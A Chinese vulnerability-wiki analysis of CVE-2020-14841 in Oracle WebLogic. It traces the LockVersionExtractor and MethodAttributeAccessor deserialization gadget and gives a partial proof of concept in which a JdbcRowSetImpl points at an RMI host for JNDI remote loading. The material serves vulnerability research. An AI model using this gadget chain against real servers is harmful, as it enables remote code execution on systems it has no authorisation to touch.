---
source: "白阁文库 BaizeSec/bylibrary"
title: "cve 2020-14841 weblogic jndi注入"
product: "Oracle WebLogic / EclipseLink Coherence integration"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2020-14841"
referenced_identifiers: "CVE-2020-2555; CVE-2020-14645"
identifier_role: "primary"
cve: "CVE-2020-14841"
prerequisites: "LockVersionExtractor/MethodAttributeAccessor classes, suitable deserialization entry and JNDI remote-loading/runtime conditions"
verification_source: "https://github.com/gobysec/Weblogic/blob/main/WebLogic_Coherence_Component_en_US.md"
source_status: "unknown"
side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-8a760588ede3c0eff2ae5455"
entity_id: "ve-8a760588ede3c0eff2ae5455"
schema_version: "1"
---

# cve 2020-14841 weblogic jndi注入

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：LockVersionExtractor/MethodAttributeAccessor classes, suitable deserialization entry and JNDI remote-loading/runtime conditions
- 证据范围：Independent partial source tracing of no-argument getter invocation through JdbcRowSetImpl; not standalone runnable reproduction.

### 已有来源支持的更正

- Researcher source explicitly associates BOTH14825 and14841 with LockVersionExtractor; do not relabel14841 as14825 solely from shared gadget

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Code snippets omit class/method closings, imports, Reflections helper, serialization and transport
- Affected versions, authentication, exact patch comparison and remediation absent
- Class blacklisting alone does not establish every version vulnerable or chain successful

### 核验来源

- https://github.com/gobysec/Weblogic/blob/main/WebLogic_Coherence_Component_en_US.md

### 操作风险与资料使用

- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## cve 2020-14841 weblogic jndi注入


## **简介**

通过diff 升级包中weblogic的黑名单，我们发现新增`oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor`这个类

## **LockVersionExtractor 分析**

```
package oracle.eclipselink.coherence.integrated.internal.cache;


import com.tangosol.io.ExternalizableLite;
import com.tangosol.io.pof.PofReader;
import com.tangosol.io.pof.PofWriter;
import com.tangosol.io.pof.PortableObject;
import com.tangosol.util.ExternalizableHelper;
import com.tangosol.util.ValueExtractor;
import java.io.DataInput;
import java.io.DataOutput;
import java.io.IOException;
import oracle.eclipselink.coherence.integrated.cache.Wrapper;
import oracle.eclipselink.coherence.integrated.internal.querying.EclipseLinkExtractor;
import org.eclipse.persistence.mappings.AttributeAccessor;


public class LockVersionExtractor implements ValueExtractor, ExternalizableLite, PortableObject, EclipseLinkExtractor {
    protected AttributeAccessor accessor;
    protected String className;


    public LockVersionExtractor() {
    }


    public LockVersionExtractor(AttributeAccessor accessor, String className) {
        this.accessor = accessor;
        this.className = className;
    }


    public Object extract(Object arg0) {
        if (arg0 == null) {
            return null;
        } else {
            if (arg0 instanceof Wrapper) {
                arg0 = ((Wrapper)arg0).unwrap();
            }


            if (!this.accessor.isInitialized()) {
                this.accessor.initializeAttributes(arg0.getClass());
            }


            return this.accessor.getAttributeValueFromObject(arg0);
        }
    }
```

我们可以从代码上看出来，类似与 cve-2020-2555，用法也都是一样的。触发漏洞的重点在于this.accessor.getAttributeValueFromObject 中。下面选取一个可能的执行路径

```
package org.eclipse.persistence.internal.descriptors;


public class MethodAttributeAccessor extends AttributeAccessor {
    protected String setMethodName = "";
    protected String getMethodName;
    protected transient Method setMethod;
    protected transient Method getMethod;

    public Object getAttributeValueFromObject(Object anObject) throws DescriptorException {
        return this.getAttributeValueFromObject(anObject, (Object[])null);
    }

    protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {
        try {
            if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {
                try {
                    return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));
                } catch (PrivilegedActionException var5) {
                    Exception throwableException = var5.getException();
                    if (throwableException instanceof IllegalAccessException) {
                        throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);
                    } else {
                        throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException);
                    }
                }
            } else {
                return this.getMethod.invoke(anObject, parameters);
            }
```

MethodAttributeAccessor中getAttributeValueFromObject函数缺点在于，只能执行无参的函数，从这点来看，我们很容易的与七月份 cve-2020-14645 联想起来


## **POC**

```
        // JdbcRowSetImpl
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("rmi://192.168.3.254:8888/xsmd");

        MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();
        methodAttributeAccessor.setGetMethodName("getDatabaseMetaData");
        methodAttributeAccessor.setIsWriteOnly(true);
        methodAttributeAccessor.setAttributeName("UnicodeSec");


        LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, "UnicodeSec");

        final ExtractorComparator comparator = new ExtractorComparator(extractor);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);


        Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);

        Field comparatorF = queue.getClass().getDeclaredField("comparator");
        comparatorF.setAccessible(true);
        comparatorF.set(queue, new ExtractorComparator(extractor));
```


---

> 来源：白阁文库 BaizeSec/bylibrary
